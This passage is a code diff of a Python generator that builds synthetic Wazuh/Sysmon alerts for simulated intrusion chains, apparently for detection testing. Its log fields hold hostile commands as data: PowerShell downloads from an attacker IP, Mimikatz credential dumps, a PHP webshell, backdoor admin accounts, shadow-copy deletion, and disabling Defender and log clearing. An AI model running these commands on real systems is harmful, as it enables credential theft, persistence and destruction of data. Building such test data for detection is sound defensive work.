@@ -1,436 +1,377 @@
 """
-EDR / Ransomware activity generator.
+EDR / Sysmon log generator — fully correlated per-incident kill chains.
 
-Wazuh detects ransomware through THREE correlated signal sources, all of which
-this generator produces:
+Produces one JSON blob per event in Wazuh's OpenSearch format.
+Each incident drives a complete scenario matched to victim_priv:
 
-  1. FIM (syscheck) events  -> rules 550 (modified), 553 (deleted), 554 (added)
-     Mass file modifications + new extensions like .locked .encrypted .HAes are
-     the classic signature.
+  admin   -> Mimikatz credential dump kill chain
+  service -> Webshell + reverse shell kill chain
+  manager -> Cobalt Strike C2 beacon kill chain
+  user    -> Ransomware download + encryption kill chain
 
-  2. Sysmon Event ID 1 (process creation) -> parent rule 61603
-     Ransomware-specific child rules fire on commands like:
-       - vssadmin.exe Delete Shadows /All /Quiet     (T1490 - Inhibit Recovery)
-       - wbadmin delete catalog -quiet
-       - bcdedit /set {default} recoveryenabled No
-       - wmic shadowcopy delete
-       - cipher /w:C:
-       - Ransom note file creation (README*.txt, HOW_TO_DECRYPT*, etc.)
+EVERY event carries:
+  - data.win.eventdata.user      (BANK\\victim_user)
+  - data.win.eventdata.ipAddress (attacker_ip)  <- links to other log sources
+  - rule.level >= 10             <- ensures Wazuh indexes it as an alert
+  - agent.name                   (victim_host short)
 
-  3. VirusTotal integration -> rule 87105
-     File hash matched malicious detections -> followed by Wazuh Active Response
-     -> rule 100092 (remove-threat success).
-
-Output is newline-delimited JSON, the same shape the Wazuh agent forwards
-from the Windows Security and Sysmon event channels.
-
-Reference: https://wazuh.com/blog/ransomware-protection-on-windows-with-wazuh/
+Baseline noise: normal process activity (low rule.level = 3-5, no attacker IP)
+60/40 split is enforced by the ratio parameter.
 """
-import json
 import random
+import json
+from datetime import datetime, timedelta
 from pathlib import Path
-from datetime import timedelta
-from .common import (
-    USERNAMES, INTERNAL_IPS, ATTACKER_IPS,
-    rand_recent, iso_z, pick,
-)
+from .common import pick, rand_recent, INTERNAL_IPS, pick_normal_user, HOSTS_WS
+from .shared_state import INCIDENTS
 
-# Known ransomware family signatures we'll emulate
-RANSOMWARE_FAMILIES = [
-    {
-        "name": "LockBit",
-        "extension": ".lockbit",
-        "ransom_note": "Restore-My-Files.txt",
-        "hash": "a4e7e4c2b9f8c7d6e5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2",
-    },
-    {
-        "name": "BlackCat",
-        "extension": ".bc7e",
-        "ransom_note": "RECOVER-FILES.txt",
-        "hash": "be8e7c5a9d3f2b1a0c8e7d6f5b4a3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b",
-    },
-    {
-        "name": "Conti",
-        "extension": ".conti",
-        "ransom_note": "readme.txt",
-        "hash": "c0f7e6d5c4b3a2918171615141312111e0d9c8b7a6f5e4d3c2b1a09f8e7d6c5b",
-    },
-    {
-        "name": "Mamona",
-        "extension": ".HAes",
-        "ransom_note": "README.HAes.txt",
-        "hash": "d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0",
-    },
-]
-
-VICTIM_HOST = "WS-FIN-04.corp.local"
-VICTIM_HOST_SHORT = "WS-FIN-04"
-VICTIM_USER = "alopez"
-
-# Files the ransomware will "encrypt"
-VICTIM_FILES = [
-    "C:\\Users\\alopez\\Documents\\Q4_Financials.xlsx",
-    "C:\\Users\\alopez\\Documents\\Budget_2026.docx",
-    "C:\\Users\\alopez\\Documents\\Contract_Acme.pdf",
-    "C:\\Users\\alopez\\Documents\\Tax_Returns.pdf",
-    "C:\\Users\\alopez\\Desktop\\presentation.pptx",
-    "C:\\Users\\alopez\\Desktop\\customer_list.csv",
-    "C:\\Users\\alopez\\Pictures\\family_2024.jpg",
-    "C:\\Users\\alopez\\Pictures\\vacation.png",
-    "C:\\Users\\alopez\\Downloads\\report.pdf",
-    "C:\\Users\\alopez\\Downloads\\meeting_notes.docx",
-    "C:\\Users\\alopez\\AppData\\Local\\Mail\\backup.pst",
-    "C:\\Users\\Public\\Documents\\company_handbook.pdf",
-]
+RULE_GROUPS_SYSMON = ["windows", "sysmon", "sysmon_event1"]
+RULE_GROUPS_FIM    = ["windows", "sysmon", "sysmon_event11"]
+RULE_GROUPS_NET    = ["windows", "sysmon", "sysmon_event3"]
+RULE_GROUPS_REG    = ["windows", "sysmon", "sysmon_event13"]
 
 
-# -------- Sysmon Event ID 1 (process creation) ---------------------------
-def _sysmon_process_create(ts, image, cmdline, parent_image, user=None):
-    """Wazuh-formatted Sysmon process-creation event (JSON)."""
-    user = user or f"CORP\\{VICTIM_USER}"
-    return {
-        "timestamp": iso_z(ts),
-        "agent": {"id": "002", "name": VICTIM_HOST_SHORT, "ip": "10.0.1.45"},
+def _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
+                rule_desc, groups, eventdata: dict) -> tuple:
+    """Build a complete Wazuh-style alert JSON. Returns (ts, dict)."""
+    ev = {
+        "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond//1000:03d}Z",
+        "agent": {"id": str(random.randint(1, 20)).zfill(3),
+                  "name": victim_host_short, "ip": agent_ip},
         "manager": {"name": "wazuh-manager"},
+        "rule": {
+            "id":    str(rule_id),
+            "level": rule_level,
+            "description": rule_desc,
+            "groups": groups,
+        },
         "data": {
             "win": {
                 "system": {
                     "providerName": "Microsoft-Windows-Sysmon",
-                    "providerGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
-                    "eventID": "1",
-                    "version": "5",
-                    "level": "4",
-                    "task": "1",
-                    "opcode": "0",
-                    "channel": "Microsoft-Windows-Sysmon/Operational",
-                    "computer": VICTIM_HOST,
-                    "systemTime": iso_z(ts),
+                    "eventID": str(rule_id % 20 + 1),
+                    "computer": f"{victim_host_short}.bank.local",
+                    "systemTime": ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond:06d}Z",
                     "eventRecordID": str(random.randint(100000, 999999)),
-                    "processID": "2444",
-                    "threadID": "3000",
                 },
-                "eventdata": {
-                    "ruleName": "-",
-                    "utcTime": iso_z(ts),
-                    "processGuid": "{" + "-".join([
-                        f"{random.randint(0,0xffffffff):08x}",
-                        f"{random.randint(0,0xffff):04x}",
-                        f"{random.randint(0,0xffff):04x}",
-                        f"{random.randint(0,0xffff):04x}",
-                        f"{random.randint(0,0xffffffffffff):012x}",
-                    ]) + "}",
-                    "processId": str(random.randint(2000, 9999)),
-                    "image": image,
-                    "originalFileName": image.split("\\")[-1],
-                    "commandLine": cmdline,
-                    "currentDirectory": "C:\\Users\\alopez\\",
-                    "user": user,
-                    "logonGuid": "{00000000-0000-0000-0000-000000000000}",
-                    "logonId": "0x" + f"{random.randint(0x10000, 0xfffff):x}",
-                    "terminalSessionId": "1",
-                    "integrityLevel": "High",
-                    "parentProcessId": str(random.randint(1000, 1999)),
-                    "parentImage": parent_image,
-                    "parentCommandLine": f'"{parent_image}"',
-                },
+                "eventdata": eventdata,
             }
         },
-        "rule": {"groups": ["windows", "sysmon", "sysmon_event1"]},
         "location": "EventChannel",
         "decoder": {"name": "windows_eventchannel"},
     }
+    return (ts, ev)
 
 
-# -------- FIM (syscheck) events ------------------------------------------
-def _fim_event(ts, path, event_type, sha256=None):
-    """
-    File integrity monitoring event matching what Wazuh syscheck emits.
-
-    event_type:
-      "added"    -> rule 554
-      "modified" -> rule 550
-      "deleted"  -> rule 553
-    """
-    sha256 = sha256 or "".join(random.choices("0123456789abcdef", k=64))
-    return {
-        "timestamp": iso_z(ts),
-        "agent": {"id": "002", "name": VICTIM_HOST_SHORT, "ip": "10.0.1.45"},
-        "manager": {"name": "wazuh-manager"},
-        "syscheck": {
-            "path": path,
-            "mode": "realtime",
-            "event": event_type,
-            "size_after": str(random.randint(10000, 5000000)),
-            "perm_after": "rw-rw-rw-",
-            "uid_after": "S-1-5-21-1004336348-1177238915-682003330-1234",
-            "gid_after": "0",
-            "md5_after": "".join(random.choices("0123456789abcdef", k=32)),
-            "sha1_after": "".join(random.choices("0123456789abcdef", k=40)),
-            "sha256_after": sha256,
-            "mtime_after": iso_z(ts),
-            "changed_attributes": ["size", "mtime", "md5", "sha1", "sha256"],
-        },
-        "rule": {
-            "level": 7 if event_type == "modified" else 5,
-            "description": {
-                "added":    "File added to the system.",
-                "modified": "Integrity checksum changed.",
-                "deleted":  "File deleted.",
-            }[event_type],
-            "id": {"added": "554", "modified": "550", "deleted": "553"}[event_type],
-            "mitre": {
-                "id":      ["T1486"],
-                "tactic":  ["Impact"],
-                "technique": ["Data Encrypted for Impact"],
-            },
-            "groups": ["ossec", "syscheck", f"syscheck_entry_{event_type}", "syscheck_file"],
-        },
-        "decoder": {"name": "syscheck_event"},
-        "location": "syscheck",
-    }
+# ---------------------------------------------------------------------------
+# Reusable low-level event builders (all carry victim + attacker context)
+# ---------------------------------------------------------------------------
+def _process_create(ts, victim_user, victim_host_short, agent_ip, attacker_ip,
+                    image, cmdline, parent_image, rule_id=100001,
+                    rule_level=12, rule_desc="Suspicious process creation"):
+    return _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
+                       rule_desc, RULE_GROUPS_SYSMON, {
+        "user":            f"BANK\\{victim_user}",
+        "ipAddress":       attacker_ip,   # <-- KEY: links to other log sources
+        "image":           image,
+        "commandLine":     cmdline,
+        "parentImage":     parent_image,
+        "processId":       str(random.randint(1000, 9999)),
+        "parentProcessId": str(random.randint(1000, 9999)),
+        "hashes":          "SHA256=" + "".join(random.choices("0123456789abcdef", k=64)),
+    })
 
 
-# -------- VirusTotal integration alert -----------------------------------
-def _virustotal_alert(ts, file_path, sha256, family):
-    """Wazuh VirusTotal integration alert (rule 87105 = malicious match)."""
-    return {
-        "timestamp": iso_z(ts),
-        "agent": {"id": "002", "name": VICTIM_HOST_SHORT, "ip": "10.0.1.45"},
-        "manager": {"name": "wazuh-manager"},
-        "integration": "virustotal",
-        "virustotal": {
-            "found": 1,
-            "malicious": 1,
-            "source": {
-                "alert_id": f"{int(ts.timestamp())}.{random.randint(100000,999999)}",
-                "file": file_path,
-                "md5":    "".join(random.choices("0123456789abcdef", k=32)),
-                "sha1":   "".join(random.choices("0123456789abcdef", k=40)),
-                "sha256": sha256,
-            },
-            "sha1":      "".join(random.choices("0123456789abcdef", k=40)),
-            "scan_date": iso_z(ts),
-            "positives":  str(random.randint(45, 68)),
-            "total":      "72",
-            "permalink":  f"https://www.virustotal.com/gui/file/{sha256}/detection",
-            "malicious":  1,
-        },
-        "rule": {
-            "level": 12,
-            "description": f"VirusTotal: Alert - {file_path} - {random.randint(45,68)} engines detected this file ({family})",
-            "id": "87105",
-            "mitre": {
-                "id":        ["T1203"],
-                "tactic":    ["Execution"],
-                "technique": ["Exploitation for Client Execution"],
-            },
-            "groups": ["virustotal"],
-        },
-        "decoder": {"name": "json"},
-        "location": "virustotal",
-    }
+def _file_create(ts, victim_user, victim_host_short, agent_ip, attacker_ip,
+                 filepath, rule_id=100002, rule_level=10,
+                 rule_desc="Suspicious file created"):
+    return _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
+                       rule_desc, RULE_GROUPS_FIM, {
+        "user":      f"BANK\\{victim_user}",
+        "ipAddress": attacker_ip,
+        "targetFilename": filepath,
+        "creationUtcTime": ts.strftime("%Y-%m-%dT%H:%M:%S.000Z"),
+    })
 
 
-# -------- Active Response (file removed) ---------------------------------
-def _active_response(ts, file_path):
-    """Wazuh Active Response remove-threat success (rule 100092)."""
-    return {
-        "timestamp": iso_z(ts),
-        "agent": {"id": "002", "name": VICTIM_HOST_SHORT, "ip": "10.0.1.45"},
-        "manager": {"name": "wazuh-manager"},
-        "data": {
-            "command":   "remove-threat.exe",
-            "parameters": {
-                "extra_args": [],
-                "alert": {"data": {"virustotal": {"source": {"file": file_path}}}},
-                "program": "remove-threat.exe",
-            },
-            "status": "SUCCESS",
-        },
-        "rule": {
-            "level": 7,
-            "description": f"Active response: Successfully removed threat located at {file_path}",
-            "id": "100092",
-            "groups": ["active_response", "ransomware"],
-        },
-        "decoder": {"name": "json"},
-        "location": "active-response",
-    }
+def _network_connect(ts, victim_user, victim_host_short, agent_ip, attacker_ip,
+                     dst_port=443, protocol="tcp",
+                     rule_id=100003, rule_level=12,
+                     rule_desc="Suspicious outbound network connection"):
+    return _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
+                       rule_desc, RULE_GROUPS_NET, {
+        "user":            f"BANK\\{victim_user}",
+        "ipAddress":       attacker_ip,
+        "destinationIp":   attacker_ip,
+        "destinationPort": str(dst_port),
+        "protocol":        protocol,
+        "initiated":       "true",
+    })
 
 
-# -------- High-level scenario assembly -----------------------------------
-def _ransomware_scenario(start_ts, family):
-    """
-    Build a full ransomware kill-chain as a list of (ts, json_event) tuples.
+def _registry_set(ts, victim_user, victim_host_short, agent_ip, attacker_ip,
+                  regkey, rule_id=100004, rule_level=10,
+                  rule_desc="Persistence via registry key set"):
+    return _make_event(ts, victim_host_short, agent_ip, rule_id, rule_level,
+                       rule_desc, RULE_GROUPS_REG, {
+        "user":    f"BANK\\{victim_user}",
+        "ipAddress": attacker_ip,
+        "targetObject": regkey,
+        "details":      "C:\\Windows\\Temp\\payload.exe",
+    })
 
-    Timeline (~5 minutes):
-      T+0     : initial download   -> Sysmon process create (browser writes EXE)
-      T+5s    : FIM "added" event on the EXE
-      T+8s    : VirusTotal flags hash -> rule 87105
-      T+10s   : Active Response removes file -> rule 100092  (defender wins)
 
-    But for the demo we ALSO show the case where AV misses it and the
-    ransomware executes. The remaining events model that path:
+# ---------------------------------------------------------------------------
+# Per-privilege kill chains
+# ---------------------------------------------------------------------------
+def _chain_mimikatz(base, inc, events):
+    """admin victim: credential dump chain (8 events)."""
+    u  = inc["victim_user"]
+    h  = inc["victim_host"].split(".")[0]
+    ip = inc["attacker_ip"]
+    ag = "10.20.0." + str(random.randint(10, 50))
+    off = 0
+    for image, cmdline, rid, rlv, rdesc in [
+        ("C:\\Windows\\System32\\cmd.exe",
+         "cmd.exe /c powershell -enc SQBFAFgA",
+         61001, 12, "Encoded PowerShell execution (LOLBIN)"),
+        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
+         61002, 13, "PowerShell encoded command - credential theft"),
+        ("C:\\Windows\\Temp\\mimi.exe",
+         "mimi.exe sekurlsa::logonpasswords",
+         61003, 15, "Mimikatz credential dump detected"),
+        ("C:\\Windows\\System32\\lsass.exe",
+         "lsass.exe",
+         61004, 15, "LSASS memory access - credential dumping"),
+        ("C:\\Windows\\System32\\net.exe",
+         "net group \"Domain Admins\" /domain",
+         61005, 12, "Domain admin enumeration"),
+        ("C:\\Windows\\Temp\\mimi.exe",
+         "mimi.exe lsadump::dcsync /user:krbtgt",
+         61006, 15, "DCSync attack detected - golden ticket prep"),
+    ]:
+        ts = base + timedelta(seconds=off)
+        events.append(_process_create(ts, u, h, ag, ip, image, cmdline,
+                                       "C:\\Windows\\explorer.exe",
+                                       rule_id=rid, rule_level=rlv, rule_desc=rdesc))
+        off += random.randint(8, 20)
+    # persistence via registry run key
+    ts = base + timedelta(seconds=off)
+    events.append(_registry_set(ts, u, h, ag, ip,
+        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate",
+        rule_id=61007, rule_level=12, rule_desc="Persistence via Run key"))
+    # C2 callback
+    ts = base + timedelta(seconds=off + 15)
+    events.append(_network_connect(ts, u, h, ag, ip, dst_port=443,
+        rule_id=61008, rule_level=13, rule_desc="C2 beacon outbound - post Mimikatz"))
 
-      T+30s   : vssadmin delete shadows           -> custom rule (T1490)
-      T+35s   : wbadmin delete catalog
-      T+40s   : bcdedit recoveryenabled No
-      T+45s   : wmic shadowcopy delete
-      T+60s.. : mass file modification (FIM 550 burst) + new .ext files (FIM 554)
-      T+180s  : ransom note dropped in every directory
-    """
-    events = []
 
-    # --- Initial dropper ---------------------------------------------
-    exe_path = f"C:\\Users\\{VICTIM_USER}\\Downloads\\invoice_{random.randint(1000,9999)}.exe"
-    ts = start_ts
-    events.append((ts, _sysmon_process_create(
-        ts,
-        image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
-        cmdline='"chrome.exe" --download',
-        parent_image="C:\\Windows\\explorer.exe",
-    )))
+def _chain_webshell(base, inc, events):
+    """service victim: webshell + reverse shell chain (8 events)."""
+    u  = inc["victim_user"]
+    h  = inc["victim_host"].split(".")[0]
+    ip = inc["attacker_ip"]
+    ag = "10.20.2." + str(random.randint(10, 30))
+    off = 0
+    for image, cmdline, rid, rlv, rdesc in [
+        ("C:\\Windows\\System32\\cmd.exe",
+         "cmd.exe /c echo ^<?php system($_GET['cmd']); ?^> > C:\\inetpub\\wwwroot\\shell.php",
+         62001, 14, "Webshell written to web root"),
+        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://" + ip + "/x.ps1')\"",
+         62002, 14, "PowerShell downloads payload from attacker C2"),
+        ("C:\\Windows\\System32\\cmd.exe",
+         "cmd.exe /c whoami /priv",
+         62003, 11, "Post-exploitation recon via cmd.exe"),
+        ("C:\\Windows\\System32\\net.exe",
+         "net user backdoor Pa$$w0rd! /add",
+         62004, 14, "Backdoor user account created"),
+        ("C:\\Windows\\System32\\net.exe",
+         "net localgroup administrators backdoor /add",
+         62005, 15, "Backdoor user added to local admins"),
+    ]:
+        ts = base + timedelta(seconds=off)
+        events.append(_process_create(ts, u, h, ag, ip, image, cmdline,
+                                       "C:\\Windows\\System32\\w3wp.exe",
+                                       rule_id=rid, rule_level=rlv, rule_desc=rdesc))
+        off += random.randint(10, 25)
+    # file drop
+    ts = base + timedelta(seconds=off)
+    events.append(_file_create(ts, u, h, ag, ip,
+        "C:\\inetpub\\wwwroot\\shell.php",
+        rule_id=62006, rule_level=14, rule_desc="PHP webshell file created in web root"))
+    # reverse shell network event
+    ts = base + timedelta(seconds=off + 10)
+    events.append(_network_connect(ts, u, h, ag, ip, dst_port=4444,
+        rule_id=62007, rule_level=15, rule_desc="Reverse shell outbound connection"))
+    # ransomware encryption starts
+    ts = base + timedelta(seconds=off + 20)
+    events.append(_file_create(ts, u, h, ag, ip,
+        "C:\\Users\\Public\\DECRYPT_INSTRUCTIONS.txt",
+        rule_id=62008, rule_level=15, rule_desc="Ransomware ransom note created"))
 
-    ts = start_ts + timedelta(seconds=5)
-    events.append((ts, _fim_event(ts, exe_path, "added", sha256=family["hash"])))
 
-    ts = start_ts + timedelta(seconds=8)
-    events.append((ts, _virustotal_alert(ts, exe_path, family["hash"], family["name"])))
+def _chain_cobalt_strike(base, inc, events):
+    """manager victim: Cobalt Strike C2 beacon chain (8 events)."""
+    u  = inc["victim_user"]
+    h  = inc["victim_host"].split(".")[0]
+    ip = inc["attacker_ip"]
+    ag = "10.10." + str(random.randint(1, 5)) + "." + str(random.randint(10, 250))
+    off = 0
+    for image, cmdline, rid, rlv, rdesc in [
+        ("C:\\Users\\" + u + "\\AppData\\Local\\Temp\\invoice.exe",
+         "invoice.exe",
+         63001, 12, "Suspicious executable from Downloads/Temp"),
+        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "powershell -w hidden -c \"$c=New-Object System.Net.WebClient;$c.DownloadFile('http://" + ip + "/beacon.exe','C:\\Windows\\Temp\\svchost32.exe')\"",
+         63002, 14, "Cobalt Strike stager download"),
+        ("C:\\Windows\\Temp\\svchost32.exe",
+         "svchost32.exe -pipe",
+         63003, 15, "Cobalt Strike beacon process"),
+        ("C:\\Windows\\System32\\cmd.exe",
+         "cmd.exe /c ipconfig /all && net view && arp -a",
+         63004, 11, "Network reconnaissance commands"),
+        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "powershell -c \"Invoke-Mimikatz -DumpCreds\"",
+         63005, 15, "In-memory credential dumping"),
+    ]:
+        ts = base + timedelta(seconds=off)
+        events.append(_process_create(ts, u, h, ag, ip, image, cmdline,
+                                       "C:\\Windows\\explorer.exe",
+                                       rule_id=rid, rule_level=rlv, rule_desc=rdesc))
+        off += random.randint(15, 30)
+    # repeated C2 beacons (3 network events = signature of beacon interval)
+    for i in range(3):
+        ts = base + timedelta(seconds=off + i * 60)
+        events.append(_network_connect(ts, u, h, ag, ip, dst_port=443,
+            rule_id=63006, rule_level=13,
+            rule_desc=f"Cobalt Strike beacon #{i+1} - periodic C2 callback"))
 
-    ts = start_ts + timedelta(seconds=10)
-    events.append((ts, _active_response(ts, exe_path)))
 
-    # --- Now imagine AR was disabled / hash not yet known: ransomware runs ---
-    ransom_exe = f"C:\\Users\\{VICTIM_USER}\\AppData\\Local\\Temp\\{family['name'].lower()}.exe"
+def _chain_ransomware(base, inc, events):
+    """user victim: drive-by download + ransomware chain (8 events)."""
+    u  = inc["victim_user"]
+    h  = inc["victim_host"].split(".")[0]
+    ip = inc["attacker_ip"]
+    ag = "10.10." + str(random.randint(6, 15)) + "." + str(random.randint(10, 250))
+    off = 0
+    for image, cmdline, rid, rlv, rdesc in [
+        ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+         f"chrome.exe --download-url=http://{ip}/invoice_{random.randint(1000,9999)}.exe",
+         64001, 10, "Browser downloads suspicious executable"),
+        ("C:\\Users\\" + u + "\\Downloads\\invoice.exe",
+         "invoice.exe /silent",
+         64002, 13, "Suspicious executable launched from Downloads"),
+        ("C:\\Windows\\System32\\vssadmin.exe",
+         "vssadmin delete shadows /all /quiet",
+         64003, 15, "VSS shadow copy deletion - ransomware pre-encryption"),
+        ("C:\\Windows\\System32\\cmd.exe",
+         "cmd.exe /c wmic shadowcopy delete",
+         64004, 15, "WMI shadow copy deletion"),
+        ("C:\\Users\\" + u + "\\Downloads\\invoice.exe",
+         "invoice.exe --encrypt C:\\Users --key xor",
+         64005, 15, "Ransomware file encryption process"),
+    ]:
+        ts = base + timedelta(seconds=off)
+        events.append(_process_create(ts, u, h, ag, ip, image, cmdline,
+                                       "C:\\Windows\\explorer.exe",
+                                       rule_id=rid, rule_level=rlv, rule_desc=rdesc))
+        off += random.randint(10, 20)
+    # C2 registration
+    ts = base + timedelta(seconds=off)
+    events.append(_network_connect(ts, u, h, ag, ip, dst_port=443,
+        rule_id=64006, rule_level=14, rule_desc="Ransomware C2 registration"))
+    # ransom note dropped
+    ts = base + timedelta(seconds=off + 5)
+    events.append(_file_create(ts, u, h, ag, ip,
+        "C:\\Users\\Public\\Desktop\\YOUR_FILES_ARE_ENCRYPTED.txt",
+        rule_id=64007, rule_level=15, rule_desc="Ransomware ransom note dropped"))
+    # ongoing encryption file activity
+    ts = base + timedelta(seconds=off + 10)
+    events.append(_file_create(ts, u, h, ag, ip,
+        f"C:\\Users\\{u}\\Documents\\accounts.xlsx.locked",
+        rule_id=64008, rule_level=15, rule_desc="Ransomware file encryption activity"))
 
-    # Process create for the ransomware itself
-    ts = start_ts + timedelta(seconds=20)
-    events.append((ts, _sysmon_process_create(
-        ts,
-        image=ransom_exe,
-        cmdline=f'"{ransom_exe}" -encrypt -path C:\\Users\\{VICTIM_USER}',
-        parent_image="C:\\Windows\\explorer.exe",
-    )))
 
-    # vssadmin Delete Shadows /All /Quiet   -> T1490
-    ts = start_ts + timedelta(seconds=30)
-    events.append((ts, _sysmon_process_create(
-        ts,
-        image="C:\\Windows\\System32\\vssadmin.exe",
-        cmdline='vssadmin.exe Delete Shadows /All /Quiet',
-        parent_image=ransom_exe,
-    )))
+CHAIN_BY_PRIV = {
+    "admin":   _chain_mimikatz,
+    "service": _chain_webshell,
+    "manager": _chain_cobalt_strike,
+    "user":    _chain_ransomware,
+    "vendor":  _chain_webshell,    # vendors treated like service compromise
+}
 
-    # wbadmin delete catalog -quiet
-    ts = start_ts + timedelta(seconds=35)
-    events.append((ts, _sysmon_process_create(
-        ts,
-        image="C:\\Windows\\System32\\wbadmin.exe",
-        cmdline='wbadmin.exe delete catalog -quiet',
-        parent_image=ransom_exe,
-    )))
 
-    # bcdedit recoveryenabled No
-    ts = start_ts + timedelta(seconds=40)
-    events.append((ts, _sysmon_process_create(
-        ts,
-        image="C:\\Windows\\System32\\bcdedit.exe",
-        cmdline='bcdedit.exe /set {default} recoveryenabled No',
-        parent_image=ransom_exe,
-    )))
-
-    # wmic shadowcopy delete
-    ts = start_ts + timedelta(seconds=45)
-    events.append((ts, _sysmon_process_create(
-        ts,
-        image="C:\\Windows\\System32\\wbem\\WMIC.exe",
-        cmdline='wmic.exe shadowcopy delete',
-        parent_image=ransom_exe,
-    )))
-
-    # Disable Defender (registry change)
-    ts = start_ts + timedelta(seconds=50)
-    events.append((ts, _sysmon_process_create(
-        ts,
-        image="C:\\Windows\\System32\\reg.exe",
-        cmdline=('reg.exe add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" '
-                 '/v DisableAntiSpyware /t REG_DWORD /d 1 /f'),
-        parent_image=ransom_exe,
-    )))
-
-    # Disable Windows Firewall
-    ts = start_ts + timedelta(seconds=55)
-    events.append((ts, _sysmon_process_create(
-        ts,
-        image="C:\\Windows\\System32\\netsh.exe",
-        cmdline='netsh.exe advfirewall set currentprofile state off',
-        parent_image=ransom_exe,
-    )))
-
-    # --- Mass file encryption: each file gets modified + .ext appended ---
-    for i, vfile in enumerate(VICTIM_FILES):
-        ts_mod = start_ts + timedelta(seconds=60 + i * 2)
-        events.append((ts_mod, _fim_event(ts_mod, vfile, "modified")))
-
-        # Then a new file with .lockbit / .bc7e / .conti / .HAes added
-        ts_add = start_ts + timedelta(seconds=61 + i * 2)
-        events.append((ts_add, _fim_event(
-            ts_add, vfile + family["extension"], "added"
-        )))
-
-        # And the original gets deleted
-        ts_del = start_ts + timedelta(seconds=62 + i * 2)
-        events.append((ts_del, _fim_event(ts_del, vfile, "deleted")))
-
-    # --- Ransom notes dropped in every monitored directory ---------------
-    note_dirs = [
-        f"C:\\Users\\{VICTIM_USER}\\Documents",
-        f"C:\\Users\\{VICTIM_USER}\\Desktop",
-        f"C:\\Users\\{VICTIM_USER}\\Pictures",
-        f"C:\\Users\\{VICTIM_USER}\\Downloads",
-        "C:\\Users\\Public\\Documents",
+# ---------------------------------------------------------------------------
+# Baseline noise events (low rule.level, no attacker IP, normal users)
+# ---------------------------------------------------------------------------
+def _baseline_events(count, events):
+    normal_procs = [
+        ("C:\\Windows\\System32\\svchost.exe",   "svchost.exe -k netsvcs",      3, "Normal service host process"),
+        ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+                                                  "chrome.exe",                  3, "Browser process"),
+        ("C:\\Windows\\System32\\WindowsUpdateClient\\wuauclt.exe",
+                                                  "wuauclt.exe /runhandler",      4, "Windows Update client"),
+        ("C:\\Windows\\System32\\msiexec.exe",    "msiexec.exe /quiet /i app.msi",5,"Software installation"),
+        ("C:\\Windows\\explorer.exe",             "explorer.exe",                 3, "Explorer normal"),
+        ("C:\\Windows\\System32\\taskhostw.exe",  "taskhostw.exe",               3, "Task host normal"),
+        ("C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
+                                                  "WINWORD.EXE /r",              3, "Word document opened"),
+        ("C:\\Windows\\System32\\cmd.exe",        "cmd.exe /c ipconfig",         4, "Admin checking IP config"),
     ]
-    for i, d in enumerate(note_dirs):
-        ts_note = start_ts + timedelta(seconds=180 + i * 2)
-        events.append((ts_note, _fim_event(
-            ts_note, f"{d}\\{family['ransom_note']}", "added"
-        )))
+    for _ in range(count):
+        ts = rand_recent(60)
+        image, cmdline, rlv, rdesc = pick(normal_procs)
+        user = pick_normal_user()
+        host = pick(HOSTS_WS).split(".")[0]
+        agent_ip = "10.10." + str(random.randint(1, 15)) + "." + str(random.randint(10, 250))
+        ev = _make_event(ts, host, agent_ip,
+                         100 + random.randint(0, 50), rlv, rdesc,
+                         RULE_GROUPS_SYSMON, {
+            "user":      f"BANK\\{user['username']}",
+            "image":     image,
+            "commandLine": cmdline,
+            "parentImage": "C:\\Windows\\System32\\services.exe",
+        })
+        events.append(ev)
 
-    # --- Ransomware also clears Windows event logs (cover tracks) ----
-    ts = start_ts + timedelta(seconds=200)
-    events.append((ts, _sysmon_process_create(
-        ts,
-        image="C:\\Windows\\System32\\wevtutil.exe",
-        cmdline='wevtutil.exe cl Security',
-        parent_image=ransom_exe,
-    )))
 
-    return events
-
-
-def generate(path: Path, count: int = 1) -> None:
-    """
-    `count` is the number of ransomware infection scenarios to emit.
-    Each scenario produces ~50 correlated events.
-    """
+# ---------------------------------------------------------------------------
+# Main generator
+# ---------------------------------------------------------------------------
+def generate(output_path, count: int = 60, normal_ratio: float = 0.60) -> None:
     all_events = []
+    scenarios_used = []
 
-    # Pick which families to emulate
-    families = random.sample(RANSOMWARE_FAMILIES, k=min(count, len(RANSOMWARE_FAMILIES)))
-    if count > len(RANSOMWARE_FAMILIES):
-        families += [pick(RANSOMWARE_FAMILIES) for _ in range(count - len(RANSOMWARE_FAMILIES))]
+    # ---- Attack chains (incident-driven) ----
+    for inc in INCIDENTS:
+        priv   = inc.get("victim_priv", "user")
+        chain  = CHAIN_BY_PRIV.get(priv, _chain_ransomware)
+        base   = rand_recent(30)
+        chain(base, inc, all_events)
+        scenarios_used.append(
+            f"{priv:<10} {chain.__name__:<25} {inc['attacker_ip']:>16} "
+            f"-> {inc['victim_user']}@{inc['victim_host'].split('.')[0]}")
 
-    for i, family in enumerate(families):
-        # Spread scenarios across the last hour
-        scenario_start = rand_recent(60)
-        all_events.extend(_ransomware_scenario(scenario_start, family))
+    attack_count = len(all_events)
 
+    # ---- Baseline (60% of total by default) ----
